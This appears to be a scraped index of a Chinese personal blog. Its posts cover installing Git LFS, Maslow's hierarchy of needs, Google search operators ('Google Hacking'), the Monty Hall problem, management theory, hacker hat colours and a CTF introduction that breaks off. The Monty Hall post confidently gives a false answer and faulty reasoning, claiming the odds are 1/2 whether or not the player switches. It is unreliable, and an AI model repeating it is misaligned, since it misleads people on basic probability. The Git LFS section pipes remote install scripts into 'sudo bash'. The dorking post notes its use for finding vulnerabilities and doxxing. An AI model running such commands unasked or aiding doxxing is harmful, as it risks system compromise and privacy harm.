可以按這裡安裝 (如果是 CentOS 那麼你只需要執行 sudo yum install epel-release)\nb. sudo yum install git\n如果你的版本是 RHEL/CentOS 6\na. curl -s https://setup.ius.io/ | sudo bash\nb. sudo yum install git2u\n如果你想，你也可以自己建構原始碼。您將需要手動下載 Git-lfs rpm 並進行安裝 rpm -i --nodeps git-lfs*.rpm。\nStep.2 安裝 git-lfs # 1curl -s https://packagecloud.io/install/repositories/github/git-lfs/script.rpm.sh | sudo bash 2sudo yum install git-lfs 3git lfs install Windows # Step.1 下載安裝檔 # 可以從 https://github.com/git-lfs/git-lfs/releases 選擇你要的版本進行下載。\nStep.2 執行安裝檔 # Step.3 在 CMD 或者 Git-Bash 執行 git lfs install # 開始使用 # 在下 git 指令時，你只需要將追蹤大檔案(超過 100 MB)的指令 git add 改成 git lfs track。\n舉例來說，如果要追蹤副檔名為.psd的大檔案，那請使用\n1git lfs track \u0026#34;*.psd\u0026#34; 而不是 git add \u0026quot;*.psd\u0026quot; ！\n並且確保檔案 .gitattributes 有被追蹤。 (這是用來告知 github 此為大型檔案的文件)\n1git add .gitattributes 之後的指令照舊， git add \u0026gt; git commit \u0026gt; git push ！\n回到 Github Repository 就可以發現成功被推送了。\n如何取消 LFS ？ # 刪除單個檔案\n如果你是要刪除單個檔案，那麼就需要麻煩點到「.gitattributes」這個檔案中去刪除單筆資料，使 Github 知道該檔案不用再被 LFS 給追蹤。 移除全部 (不使用 LFS 了)\n你需要使用指令「git lfs uninstall」，如果你是較舊的版本則是使用指令「git lfs uninit」來刪除該 Repository 中的 LFS 。\n另外也請確保檔案「.gitattributes」不再被追蹤。(建議如果不需要，請直接下 git rm .gitattributes 刪除它) 範例:\n1git lfs uninstall 2git rm .gitattributes 3git add . 4git commit \u0026#34;Uninstall LFS\u0026#34; 5git push origin main 參考資料 # 《Git Large File Storage》https://git-lfs.github.com/ 《Cover Image》https://git-lfs.github.com/images/graphic.gif ","date":"2021/03/28","externalUrl":null,"permalink":"/posts/git-lfs/","section":"","summary":"\u003cp\u003e使用 git push 推送檔案到 Github 上時，被告知\u003cstrong\u003e檔案太大\u003c/strong\u003e無法推送！？馬上教你怎麼解決！\u003c/p\u003e","title":"Github 檔案太大無法推送！？安裝「Git-LFS」馬上解決！","type":"posts"},{"content":"Maslow 將心理需求與生理需求分成了五個層級來探討\u0026hellip;\n起源 # Maslow’s Hierarchy Of Needs (馬斯洛 需求層次理論) 是由一名美國心理學家 Abraham Harold Maslow 於 1943 年《心理學評論》的論文〈人類動機的理論 (A Theory of Human Motivation)〉 中所提出的理論。該理論屬於心理健康的理論，主張認為人類天生的需求是首先要被滿足的，隨後更進一步滿足自己，最後達成自我實現。\nAbraham Harold Maslow (圖源: Wiki 維基百科) 需求比較 # 凡是人便有需求，食衣住行娛樂皆是。\n而這些需求有輕重緩急之分，舉例「食」相較「娛樂」來的更重要，因此在滿足「食」的需求之前，「娛樂」先放一旁。又好比說「安全」與「理想」來說，當一個人面臨威脅自身安全的處境而又無法解決時，是沒有心思去思考自己的理想的，安全相對是更重要的，也正是大家常聽到的「安全第一」。\nMaslow 將這些需求進行排列、分級就形成了著名的「需求層級圖」。\n需求層級 # 需求層級圖 (圖源: Wiki 維基百科) 這些需求被以優先需要的程度高至低分別為下到上分級，及形成上圖的需求層級金字塔。\n以下為生理層面的需求：\nPhysiological Needs (生理需求) # 級別最低，在整個需求層級金字塔最底部，也就是最優先需要的層級。\n其中就包括空氣、食物、水、睡眠、性等。\n這些是使人能存活下去的主要條件。當不被滿足時，其他層級的需求相對不再重要，甚至可能被捨棄，像是「烏拉圭空軍 571 號班機空難」事件中，遇難的 45 人中，只剩 16 名生還者，使這些生還者能夠生存的關鍵在於，他們選擇吃了其他同伴的遺體，聽起來殘忍，但也正是因為這個選擇滿足了生理需求才能活下來。\n「倖存者的食物很少：幾塊巧克力、什錦點心和幾瓶紅酒。墜機後的幾天裡，眾人將食物分成很少的量，以免把他們微薄的補給用盡。費托還設計一種把雪融成水的辦法，他把雪放上金屬座位。用陽光把雪融掉後滴入空酒瓶。即便分配很嚴格，他們的食物還是很快地減少。白雪皚皚的山上不會有天然植物或動物存活。眾人作出集體決定，吃死去戰友的屍體。這個決定不是輕易做出的，因為大多死難者都是親密的朋友和同學。」 - Wiki 維基百科\nSafety Needs (安全需求) # 為次要需求層級，在滿足了 Physiological (生理) 層面的需求後，生物的基本生存條件就被鞏固了，但以群觀視角來說，依舊無法滿足真正「穩定的生存」。\n對一般動物而言，身處的環境及自己處在食物鏈的哪一環決定了自己的安全條件如何。而人類不只是如此，人類還必須得面臨在人類社會中的經濟問題。\n諸如人身安全、生活安穩、疾病或痛苦、威脅等，只要是影響到自身生命安全的因素，皆是屬於該層級。\n以上皆是為了「生存」的生理需求，\n從這裡才開始有了心理需求：\nLove And Belonging Needs (愛與歸屬感需求) # 又稱「社交需求」。既然是「社交」就不會只有自己。\n生理需求中所作的一切都只是為了自己，讓自己能夠活下去，但在此層級中，開始會為他人著想、付出。\n開始有了親情、友誼、愛情等需求，可以為了愛付出貢獻，甚至是無私的奉獻。\nEsteem Needs (尊嚴需求) # 屬於高級需求。在文明社會中，大家所追求的基本上就是該層級的相關內容。\n尊嚴不只是他人對自己，也包括自己對自己，分別又稱外部尊重及內部尊重。\n舉例社會地位、成就、名聲、被他人認同、被他人尊重屬於外部尊重；\n自我認知價值、自信(自我肯定)、自尊則屬於內部尊重。\nNeed For Self-Actualization (自我實現需求) # 為最高層級的需求。主要是指獲得更高人生境界的需求。\n像是發覺自我潛能、做到自我實現等。\n聽起來很複雜，但例子就在生活周遭：愛護動物而選擇吃素、運動國手勤奮訓練為了超越自己、為了幫助弱勢族群而捐款，是一種衍生性需求。\nOver Actualization (超自我實現) # Maslow 在晚期提出的延伸理論。\n當人們充分的滿足 Need For Self-Actualization (自我實現需求) 時，所出現短暫的「高峰體驗」。\n可能是成就感或某種體悟，通常都是在進行或完成一件事情時，深刻體驗到的感覺，通常藝術家或是音樂家較常體會到。\n「一位音樂家，在演奏音樂時，所感受到的一股「忘我」的體驗。一位藝術家在畫圖時，感受不到時間的消逝，他在畫圖的每一分鐘，對他來說跟一秒一樣快，但每一秒卻活的比一個禮拜還充實。」 - Wiki 維基百科\n參考資料 # 《Wiki 維基百科 - 需求層級理論》https://zh.wikipedia.org/wiki/%E9%9C%80%E6%B1%82%E5%B1%82%E6%AC%A1%E7%90%86%E8%AE%BA\n","date":"2021/03/17","externalUrl":null,"permalink":"/posts/maslow-s-hierarchy-of-needs/","section":"","summary":"\u003cp\u003eMaslow 將心理需求與生理需求分成了五個層級來探討\u0026hellip;\u003c/p\u003e","title":"Maslow's Hierarchy Of Needs","type":"posts"},{"content":"","date":"2021/03/17","externalUrl":null,"permalink":"/tags/psychology/","section":"Tags","summary":"","title":"Psychology","type":"tags"},{"content":"","date":"2021/03/05","externalUrl":null,"permalink":"/tags/google/","section":"Tags","summary":"","title":"Google","type":"tags"},{"content":"這個被稱作「Google Hacking」的技巧，不僅可以快速找到你要的資料，甚至常被拿來\u0026hellip; 肉搜。\nSearch Engine # 搜尋引擎是利用 Web-Crawler (網絡爬蟲) 技術為基礎所製作的一種工具，其目的顧名思義就是用來搜索資料。\n搜索引擎是現代人不可沒有的一項發明，成堆的檔案、照片、音樂總是讓人需要花大把時間將其分類，一陣子沒注意，下一次在找檔案時可能就要花許多時間，直到搜尋引擎的出現。\n其中， Google 的搜索引擎最為出名且被廣泛運用，由於非常強大，身為名詞的「Google」如今在許多地方已經被當作動詞使用，舉例來說，現在的人總是將「上網找資料」直接稱作「上網 Google」，這也間接說明了 Google 搜索引擎的影響力。\n以下為你介紹關於 Google　搜尋引擎，你所可能不知道的技巧。\n基礎技巧 (應該很多人都知道了) # 過舊的資訊過濾 # 在 Google 搜索引擎上，位於搜尋欄位右下角的「工具」按鈕，透過設定時間，可以過濾掉許多老舊、雜亂的資訊，讓你能更快速找到你要的資料。\n精準搜尋圖片 # 在圖片搜索後，按下搜索欄位旁的「設定 \u0026gt; 進階搜尋」即可過濾不必要的關鍵字，甚至可以選擇圖片比例、格式、地區、使用權等。\n以圖搜圖 # 這個相信比較多人知道，不過為了還不知道的朋友還是說一下。\n一般來說我們搜尋圖片都是以「關鍵字」搜尋後得到結果，但 Google 允許你使用「圖片」進行搜索。許多人盜用網美照行騙，在過去可能很難查證照片真偽，現在則只需要將圖丟上網以圖搜圖，立刻抓包！\n點選圖片搜尋欄位的右方相機圖示，即可選擇要搜尋的圖片，可以使用網址或者本地上傳。\n進階技巧 - Google Hacking # Google Hacking 又稱 Google Dorking，是一種利用 Google 內建的搜尋功能來找到安全漏洞或敏感資訊的技巧。許多人並不知道，Google 是可以透過許多內建的過濾器來更精準的搜索資訊的，而這些技巧也很常被用於肉搜。\n特定標題 # 可以透過「intitle:\u0026quot;標題\u0026quot; 關鍵字」來搜索特定標題的網站。\n舉例「intitle:\u0026quot;新北市\u0026quot; 反毒」可以用來搜尋標題含有「新北市」且內容含有「反毒」的相關資訊\n網頁內容含有特定文字 # 可以透過「intext:\u0026quot;文字\u0026quot;」來搜索含有特定文字的網站。\n舉例「intext:\u0026quot;麥當勞活動\u0026quot;」可以用來搜尋網站內容中含有「麥當勞活動」文字的頁面。(並非只是關鍵字，而是更加精確的特定文字)\n特定網域 # 透過「site:\u0026quot;網域\u0026quot; 關鍵字」來搜尋基於該網域下關於該關鍵字的搜尋結果。\n舉例「site:\u0026ldquo;www.dcard.tw\u0026rdquo; 情侶 吵架」可以搜尋「www.dcard.tw」網站中內容含有「情侶 吵架」相關的頁面。\n含有特定文字的網址 # 可以透過「inurl:文字」來搜索含有該字串的網址。\n舉例「inurl:login」可以用來搜尋「網址」中含有「login」的結果。\n特定檔案格式 # 查詢特定檔案格式可以用「filetype:格式 關鍵字」來搜尋。\n舉例「filetype:doc 統一超商 財務報表」可以搜尋與「統一超商 財務報表」有關且為「.doc」的文件。也可以使用「ext:doc」來精確搜尋副檔名。\n網頁在 Google 的 Cache (快取) # 可以透過「cache:\u0026quot;網域\u0026quot;」來搜索網站在 Google 中的緩存。\n舉例「cache:\u0026quot;reddit.com\u0026quot;」可以用來搜尋「reddit.com」在 Google 中的緩存。\n單字的解釋、定義 # 可以透過「define:單字」來搜索關於該單字的解釋、定義。(前提是 Google 要有收入該單字)\n舉例「define:科普」可以用來搜尋「科普」在 Google 中解釋、定義。\n其他運用 # 混合查詢 # 舉例「site:\u0026quot;i.4cdn.org\u0026quot; filetype:pdf intitle:test」。\n強調搜尋、排除搜尋 # 關鍵字前加上「+」可以強調搜尋，加上「-」則排除相關資訊。\n舉例以下搜尋結果會顯示關於「台灣風景」的資訊，尤其「台南」，並且排除關於「台北」關鍵字的資訊。\n精確搜尋 # 用雙引號「\u0026quot;」將關鍵字框起可以更加精確的搜尋。\n舉例將搜尋「台大醫院」改為「\u0026ldquo;台大醫院\u0026rdquo;」\n更多用法請自行上網搜尋 # 以下附上網路上其他人製作的表格：\n圖源: imgur.com ","date":"2021/03/05","externalUrl":null,"permalink":"/posts/google-hacking/","section":"","summary":"\u003cp\u003e這個被稱作「\u003cstrong\u003eGoogle Hacking\u003c/strong\u003e」的技巧，不僅可以快速找到你要的資料，甚至常被拿來\u0026hellip; \u003cstrong\u003e肉搜\u003c/strong\u003e。\u003c/p\u003e","title":"進階 Google 搜尋技巧 - Google Hacking","type":"posts"},{"content":"","date":"2021/03/04","externalUrl":null,"permalink":"/tags/mathematics/","section":"Tags","summary":"","title":"Mathematics","type":"tags"},{"content":"三分之一的機率中，可以透過更換選擇來提高機率，這是曾經讓許多人摸不著頭緒的 Monty-Hall Problem (三門問題)，你能參透其中的答案嗎？\n起源 # Monty-Hall Problem 又稱三門問題、山羊問題、蒙提霍爾問題。\n起源是一個源自Game Theory (博奕論)的數學遊戲問題，最早推測可能出自 1963 年的一個美國電視遊戲節目 - 「Let's Make a Deal (讓我們一起交易)」，其中該節目的主人名為「Monty Hall」，故稱做「Monty-Hall Problem」。\n三門遊戲 # 圖源: Wiki 維基百科 在節目中，參賽者的面前會有三道關閉的門，其中一道門後有著一輛汽車，其餘兩道門後則是山羊(我也不知道為啥是山羊\u0026hellip;)，若是參賽者選中門後為汽車的門，那麼即可贏得汽車。\n遊戲開始後，主持人會要求參賽者選擇一道門，不論這道門後是汽車或者山羊，主持人都會開啟參賽者所選的門之外，其餘兩道門中含有山羊的那道門 (主持人是知道門後狀況的)。\n舉例，三道門分別為 A、B、C ，參賽者選擇了 C ，若是 B、C 門後皆為山羊，那麼主持人則會開啟 B 門；若是 A、B 門後為山羊，那麼主持人隨機選擇開啟 A 或 B 門。\n到目前為止沒什麼太大問題，這時候我們探討的核心問題是\u0026hellip;\n「在主持人打開一道背後是山羊的門後，會詢問參賽者是否要更換剛剛所選的門，若是選擇換門，那麼參賽者贏得汽車的的機率是否會增加？」\n聽起來很荒謬對吧！換不換門，其實對於結果並不會改變才對。\n但若是我告訴你，這的確會使得贏得汽車的機率提高至 1/2 呢？\n驗證 # 為了方便探討機率，我們實際列舉所有可能性:\n先假設 A、B 門後是山羊，而 C 門後則是汽車\n不換門 參賽者堅持選擇 A 門，獲得山羊 參賽者堅持選擇 B 門，獲得山羊 參賽者堅持選擇 C 門，獲得汽車 由此可知，贏得汽車機率為 1/3\n換門 參賽者選擇 A 門，主持人開 B 門，參賽者換 C 門，獲得汽車 參賽者選擇 B 門，主持人開 A 門，參賽者換 C 門，獲得汽車 參賽者選擇 C 門，主持人開 A 門，參賽者換 B 門，獲得山羊 參賽者選擇 C 門，主持人開 B 門，參賽者換 A 門，獲得山羊 欸？贏得汽車的機率變成 1/2 ！？\n這太不符合常理了，怎麼可能在選擇過後機率發生改變！？\n別擔心，帶你繼續看下去。\n但在解答之前，喜歡解題的朋友，可以先停在這邊好好思考一下。\n解答 # 其實，機率是沒有變的，一直都是 1/2！\n在一開始的選擇當中，三道門選一道的機率確實是 1/3，但在主持人開啟一道門後(後面是山羊的門)，這等於刪除了一道門，此刻若是再給參賽者一次選擇，這次的選擇機率將會是 1/2，重點在於，我們必須將前後兩次選擇視為 獨立事件，真正影響參賽者贏得汽車機率的關鍵在於第二次的選擇。\n我們再來重新列舉一次可能性:\n先假設 A、B 門後是山羊，而 C 門後則是汽車\n並且 主持人已經開啟一道門 (第一次選擇不重要，此指的選擇是第二次選擇)\n不換門 主持人刪除 B 門，參賽者仍選擇 A 門，獲得山羊 主持人刪除 A 門，參賽者仍選擇 B 門，獲得山羊 主持人刪除 A 門，參賽者仍選擇 C 門，獲得汽車 主持人刪除 B 門，參賽者仍選擇 C 門，獲得汽車 機率為 1/2\n沒錯，這道陷阱題使人容易忽略了參賽者選擇汽車那道門時，主人持人選擇刪除門的可能性是有兩種的。\n圖源: Wiki 維基百科 結論 # 這麼一來你知道為什麼了嗎？(如果還是很矇，可以再重頭看一次XD)\n有時候看一件事物時， 第一直覺 有可能會是 錯 的，當你深信自己的第一直覺而不求證時，很容易造成如同該題目一般的狀況，一直反覆的問自己為什麼，總是不能理解為什麼機率為 1/2 。\n那是因為題目一開始就告訴你機率是 1/3 ，而我們在看到題目是「三道門選一道」的時候，就對此深信不已。\n","date":"2021/03/04","externalUrl":null,"permalink":"/posts/montyhall-problem/","section":"","summary":"\u003cp\u003e\u003cstrong\u003e三分之一\u003c/strong\u003e的機率中，可以透過\u003cstrong\u003e更換選擇\u003c/strong\u003e來\u003cstrong\u003e提高機率\u003c/strong\u003e，這是曾經讓許多人摸不著頭緒的 Monty-Hall Problem (三門問題)，你能參透其中的答案嗎？\u003c/p\u003e","title":"Monty-Hall Problem 三門問題｜選擇的順序改變了機率？並非如此！","type":"posts"},{"content":"","date":"2021/03/04","externalUrl":null,"permalink":"/categories/popular-science/","section":"Categories","summary":"","title":"Popular-Science","type":"categories"},{"content":"負責管理真的比較輕鬆嗎？責任與壓力不是人人都可以承擔的。\n14 項管理原則 (Principles Of Management) # 上一篇文章提到的那位提出「古典管理理論 (法約爾主義)」的法國管理學理論學家 Henri Fayol (亨利·法約爾) 總結出了14 項管理原則：\n勞動分工 (Division Of Work) 該原則屬於自然規律。和 Adam Smith (亞當·史密斯) 的「分工理論」相同。專業化使得員工提高效率來提升產出。通過分工來提高管理工作的效率，但勞動分工有一定的限度，經驗與尺度感告訴我們不應超越這些限度。 權力與責任 (Authority and Responsibilities) 管理者必須擁有能夠下達指令的權利，而「有權利就也代表著有責任」，這就是著名的權責相符原則。而要貫徹權責相符原則，就應該要存在有效地獎勵和懲罰制度。 紀律 (Discipline) 員工必須嚴謹的遵守組織規章，而規章是領導人造就的，其紀律狀況主要取決於其領導人的道德標準。 紀律是一個企業成功的關鍵，若沒有紀律，任何一個企業都不能興旺繁榮。 制定和維持紀律最有效的辦法是： 優良的領導：一個好的紀律來源於有效的領導力。 明確而又公平的協定：管理者必須能與下屬有效溝通、理解。 合理的懲罰機制：違反紀律者必須給予正確地懲罰 統一命令 (Unity Of Command) 下屬只能接受一位上司的命令。 如果兩個領導人同時對同一個人或同一件事下達命令就容易形成混亂。任何情況下都不會出現「適應雙重指揮」的社會組織。 統一領導 (Unity Of Direction) 只能有一個領導人和一項計劃。聽起來跟統一命令 (Unity Of Command)很像，但統一命令 (Unity Of Command)所強調的是「一個下屬只能接受一個上級的指令」，而統一領導 (Unity Of Direction)強調的則是「一個下屬只能有一個直接上級」。 個體利益服從整體利益 (Subordination Of Individual Interest to the General Interest) 犧牲小我，完成大我。任何員工的利益都不應該居先於組織整體的利益。 報酬 (Remuneration) 員工必須被支付與自己的付出 合理、公平的薪水，同時不應導致超過合理限度的過多報酬。 集權或分權 (Centralization Or Decentralization) 集權指的是下級參與組織決策制定的程度。目的在於對於各種情況找到最適合的集權程度。 舉例當一般小型企業，上級在傳達命令給下級時，幾乎可以直接傳達，這種權力擴散範圍小、較集中，等於集權程度高，這種管理方式稱為「集權管理 (Centralized Management)」。 而相較大型企業來說，例如「Google」則不可能如此運作。在大型企業中，由上級傳達命令給下級的過程中，可能會經過許多中階的部門或人員，此時權力就被分散了，等同集權程度小，這樣的管理方式又稱「分權管理 (Decentralized Management)」。 層級制度 (Scalar Chain/Line Of Authority) 主要原則是指必須創造一個「由高至低階級的層級所劃分構成」的層級鏈，而組織中的溝通應當遵循這條等級鏈的路徑。 層級鏈使組織中各環節之間的權力關係更加明顯。有了這個等級鏈，組織中的成員就可以更明確了解各個階級的權力關係，以及誰有資格對誰下達命令，誰又應該對誰負責等。 這同時也表明了組織中信息傳遞的路徑。 雖然說組織中的溝通需要透過等級鏈的路徑一步一步執行，但在許多時候為了避免資訊傳達過慢，或者傳遞的中繼單位太多而導致訊息失真等，也會採取直接越級溝通的方式。(前提是雙方皆同意) 秩序 (Order) 任何的人和物都應該在合適的時間、合適的地點出現。秩序原則就是要求「每個人都待在最能使自己能力發揮的工作崗位工作」，就好比「每一件物品都放在它應該放的位置上」。 要符合秩序原則，首先要對企業的社會需求與資源有確切的理解，並保持兩者之間經常的平衡；同時要消除任人唯親、偏愛徇私、野心奢望和無知等弊病。 公平 (Equity) 上級應該寬容和公正同時又不忽視任何原則地對待下級。 人員穩定 (Stability Of Tenure Of Personnel) 一個人到了新職位，從適應、調適、熟悉自身工作內容，一直到能很好地完成自己的工作，這個過程需要耗費時間成本，因此高的人員流動是沒有效率的。 管理員應該規劃有秩序的人員安排，並且保持隨時有代替人員可以填補空位。 首創精神 (Initiative) 人的自我實現需求滿足是激勵人們的工作熱情和工作積極性最有力的刺激因素。想出一個計畫並使其成功是一個聰明人的最大快樂之一，這造就了首創精神 (Initiative)的核心目的「職員會在被允許創立和執行自己的計劃時發揮更高水平的努力」。 團隊精神 (Esprit de Corps) 管理者需要培養員工正確的工作態度。在團隊精神 (Esprit de Corps)原則中，員工不該有自私自利的心態，為了增加組織的團結，員工必須有個人和集體積極的工作態度，促進團體中的和諧與團結。 Henry Mintzberg 的 3 大類、10 種角色 # 管理思想家 Henry Mintzberg (亨利·明茨伯格) 歸類出了 10 種角色並分成 3 大類：\n人際角色 # 代表人 (Figurehead) 團隊單位的代表，對外以團隊名義參與活動。 領導人 (Leader) 給予下屬指揮及下達命令。 聯絡人 (Liaison) 建立良好的組織內外關係和網絡，做好溝通、傳達、收集訊息等任務。 信息 # 監控者 (Monitor) 透過收集組織內外消息以分析出組織的潛在機會和威脅。 傳播者 (Disseminator) 將接收到的組織外部資訊傳播給組織內部。 發言人 (Spokesman) 將組織內部欲傳遞給外部的訊息，代表整個單位傳遞。 決策角色 # 創業家 (Entrepreneur) 發現機會並進行投資。 危機處理者 (Disturbance Handler) 處理危機事件及衝突。 資源分配者 (Resource Allocator) 決定資源分配的對象及數量。 談判者 (negotiator) 負責組織與客戶、供應商的商業談判。(包含員工的勞資談判。) 參考資料 # Wiki 維基百科：https://zh.wikipedia.org/wiki/%E8%A1%8C%E6%94%BF%E7%AE%A1%E7%90%86%E5%AD%B8%E6%B4%BE\nMBA 智庫百科：https://wiki.mbalib.com/zh-tw/14%E9%A1%B9%E7%AE%A1%E7%90%86%E5%8E%9F%E5%88%99\n","date":"2020/10/23","externalUrl":null,"permalink":"/posts/management-science-02/","section":"","summary":"\u003cp\u003e負責管理真的比較\u003cstrong\u003e輕鬆\u003c/strong\u003e嗎？\u003cstrong\u003e責任\u003c/strong\u003e與\u003cstrong\u003e壓力\u003c/strong\u003e不是人人都可以\u003cstrong\u003e承擔\u003c/strong\u003e的。\u003c/p\u003e","title":"《Manage-Sci 02》管理原則、角色分配｜管理的運作架構","type":"posts"},{"content":"","date":"2020/10/23","externalUrl":null,"permalink":"/tags/management-science/","section":"Tags","summary":"","title":"Management-Science","type":"tags"},{"content":"","date":"2020/10/23","externalUrl":null,"permalink":"/series/management-science/","section":"Series","summary":"","title":"Management-Science","type":"series"},{"content":"","date":"2020/10/23","externalUrl":null,"permalink":"/categories/management-science/","section":"Categories","summary":"","title":"Management-Science","type":"categories"},{"content":"為什麼學習管理學？因為在這個社會，你不是管理別人、就是被人管理！你打算怎麼選擇？\n學習目的 # 管理 (Management) 指的是 協調 及 監督 與他人的 業務，讓其有 效率、有 效能 地完成。\n至於何謂「效能」、「效率」？\n管理大師 彼得‧杜拉克 (Peter Ferdinand Drucker) 是這麼說的：\n效率 (Efficiency)\n把事情做對 (Doing the thing right) 。\n強調資源的有效利用，以最少投入得到最大產出。 效能 (Effectiveness)\n做對的事情 (Doing the right thing) 。\n追求目標與方向正確性，將「完成工作活動以達成組織目標」看的比「資源的運用」更為重要。 廣義、狹義 的 組織結構 # 狹義 指為了實現組織的目標，組織理念下經過組織設計所形成的組織內部部門、各個層次之間的排列方式，即組織內部的構成方式。 廣義 包含狹義的組織結構。 「組織」主要是指有目的、系統的集合。 簡單來說，組織就是指為了實現一致的目標，而互相合作，集結而成的集體或團體， 如企業、黨團\u0026hellip;等。 管理 與 被管理 # 非管理者員工 直接從事工作與執行任務的人員，沒有監督其他人工作的責任。 管理者 (Managers) 在組織中負責指揮及監督下屬工作活動的人員，藉由協調他人來完成工作，以便達成組織目標，必要時也會親自執行任務。 管理者的工作著重在協助他人進行工作。 管理者階級 # 基層管理者 (First-Line Managers) 又稱第一線管理者 。負責非管理職員工作的管理，通常負責指揮他們的日常作業。 常見的基層管理者職位： 領班 (Supervisors) 組長 (Shift Managers) 課長 (Office Managers) 部門經理 (Department Managers) 單位協調者 (Unit Coordinators) 中階管理者 (Middle Managers) 負責管理基層管理者的活動。在管理者職位中，介於基層與高層之間 (難做人)。 常見的中階管理者職位： 部門經理或局長 (Department Or Agency Head) 專案領導者 (Project Leader) 單位主管 (Unit Chief) 地區經理(District Manager) 事業部經理 (Division Manager) 店經理 (Store Manager) 高階管理者 (Top Managers) 屬於組織架構中位於或接近組織頂端的管理者。負責全公司的決策，訂定全公司的計劃和目標。 常見的高階管理者職位： 副總經理 (Vice President) 總經理 (President) 校長 (Chancellor) 執行董事 (Managing Director) 營運長 (Chief Operating Officer) 執行長 (Chief Executive Officer) 董事長 (Chairperson Of The Board) 管理者該做些什麼？管理學四大功能！ # 起初，法國的管理學理論學家 Henri Fayol (亨利·法約爾) 歸類出的「古典管理理論 (法約爾主義)」為：規劃 (Plan)、組織 (Organize)、命令 (Command)、協調 (Coordinated)、控制 (Control)。\n隨後，美國 UCLA 的教授 Harold Koontz 和 Cyril O\u0026rsquo;Donnell 提出管理五大功能：規劃 (Planning)、組織 (Organizing)、人事 (Staffing)、領導 (Leading)、控制 (Controlling)。\n而在現代管理理論中，管理功能已被濃縮成四項：規劃 (Planning)、組織 (Organizing)、領導 (Leading)、控制 (Controlling)。\n規劃 (Planning) 訂定組織發展的目標及方向及達成目的的方法。(錯的方向努力等同徒勞) 組織 (Organizing) 界定部門間的職掌、權責，透過安排和架構工作完成組織目標。 領導 (Leading) 目的在於激勵員工，使其自發性朝向組織目標努力，以提供最大貢獻。 控制 (Controlling) 檢視執行過程及結果，對重大差異提出修正，將錯誤的方向導回正軌，以確保組織目標的達成。 每個階層對於這四項管理功能的比重都有所不同：\nfirst-line-managers middle-managers top-managers 管理者該具備什麼？ # 概念能力 (Conceptual Competencies) 掌握和協調組織的整體利益和活動。 人際關係能力 (Human Competencies) 以領導、激勵和溝通來達成組織的目標。 技術能力 (Technical Competencies) 利用特殊的技術，以完成特定的管理任務。 政治能力 (Political Competencies) 建立正確的關係或權力基礎。 ","date":"2020/10/22","externalUrl":null,"permalink":"/posts/management-science-01/","section":"","summary":"\u003cp\u003e為什麼學習\u003cstrong\u003e管理學\u003c/strong\u003e？因為在這個\u003cstrong\u003e社會\u003c/strong\u003e，你不是\u003cstrong\u003e管理別人\u003c/strong\u003e、就是\u003cstrong\u003e被人管理\u003c/strong\u003e！你打算怎麼選擇？\u003c/p\u003e","title":"《Manage-Sci 01》組織、管理者、四大功能｜管理 與 被管理","type":"posts"},{"content":"","date":"2020/10/20","externalUrl":null,"permalink":"/tags/hacker/","section":"Tags","summary":"","title":"Hacker","type":"tags"},{"content":"時常在好萊塢電影中看到駭客的身影，他們給人的形象往往都是負面、惡意且具有強烈人格特質的，這不僅讓人被那獨特的魅力吸引，更多的是那讓人想一探究竟卻又不敢接近的神秘，因此「駭客」一詞也常受到大家尊敬及崇拜。 何為 Hacker (駭客) ？ # 實際上「駭客」所指的意思僅僅是「對計算機知識有著高度理解力的人」，屬於正向名詞。也就是說，駭客其實是包含著正義與邪惡的，我們通常習慣用各種顏色的「帽子」來稱呼：\nBlack Hat Black Hat (黑帽) 黑帽駭客通常就是大家刻板印象中的那種，因特定目的而執行「網絡攻擊、竊取資料、販賣個資」等違反計算機安全行動的人，通常是為了從中獲取利益。 White Hat White Hat (白帽) 又稱「道德駭客」，通常指的是資訊安全人員、安全顧問等相關職位，亦可指為打擊網絡犯罪盡力的駭客。他們經常幫助企業進行 Pen-Test (滲透測試)檢測漏洞並回報。 Gray Hat Gray Hat (灰帽) 又稱「自由駭客」，就像黑帽與白帽的綜合，通常為了自己的信念，可以做出如同黑帽的犯罪行為，但在許多時候，也會出面打擊犯罪，可以說是遊走在法律邊界。 許多時候他們所發起的攻擊行動僅僅是想提醒對方「你的系統有漏洞」，既不完全為了利益，也並非都是惡意。 如果還要再細分，那麼還可以分成：\nRed Hat Red Hat (紅帽) 簡單來說，可以理解成是受聘於政府單位的駭客。他們為政府做事，包括像是政府養的網軍，在必要時對敵國發起網絡攻擊。他們雖然像白帽一樣打擊黑帽，但卻是以惡意攻擊的方式來反擊，用以暴制暴的方式來打擊犯罪。 Blue Hat Blue Hat (藍帽) 又稱「報復者」，他們平時不為非作歹，但會在受到挑釁、威脅等可能危害自身利益的情況時，會用惡意攻擊的方式反擊對方。標準的「人不犯我，我不犯人」。 Green Hat Green Hat (綠帽) 可以理解成是初入的萌新，努力的學習計算機知識，充滿希望的一張白紙。只要有心，任何人都可以成為下一個綠帽駭客。(帽子要帶好www) 其他分類 # Cracker Cracker (劊客) 又稱「破壞者」，一般大家所認知的那種專門搞破壞、竊取資料、散播電腦病毒的駭客，我們可以稱作「Hacker (駭客)」但更準確的稱呼則是「Cracker (劊客)」。他們通常沒有道德標準(或很低)。Hacker 們建造，而 Cracker 負責破壞。 Script Kiddie Script-Kiddie (腳本小子) 為貶義詞，通常用來描述那些以「駭客」自居並沾沾自喜的初學者。\n他們通常沒有太高的技術，且喜歡使用他人所開發好的攻擊程式來惡意破壞他人系統，藉此使得他的朋友感到驚訝，並期望因此受到崇拜。\n在資訊安全領域中，這種人幾乎在哪都受到唾棄。 更多詳情 # 更多詳情請看 Wiki 維基百科 - Hacker ","date":"2020/10/20","externalUrl":null,"permalink":"/posts/hacker/","section":"","summary":"時常在好萊塢電影中看到駭客的身影，他們給人的形象往往都是負面、惡意且具有強烈人格特質的，這不僅讓人被那獨特的魅力吸引，更多的是那讓人想一探究竟卻又不敢接近的神秘，因此「駭客」一詞也常受到大家尊敬及崇拜。","title":"Hacker 駭客的定義｜白帽？黑帽？灰帽？｜各種帽子顏色所代表的含意","type":"posts"},{"content":"一個讓駭客及資安人員都熱血沸騰的競賽\nCTF (Capture The Flag) # CTF 全名 Capture The Flag，又稱奪旗賽，起源於 1996 年 DEFCON 世界駭客大賽，是一種基於網絡安全技術下的競技項目。\n該競技主要玩家多半為網絡安全技術人員、駭客等擁有對計算機安全相關知識感興趣的人。\nCTF 都在做些什麼？ # 如同名稱一般，是一種奪旗纇競賽。雙方或多方玩家需要拿下對手的「旗子」，率先奪旗成功方即獲勝 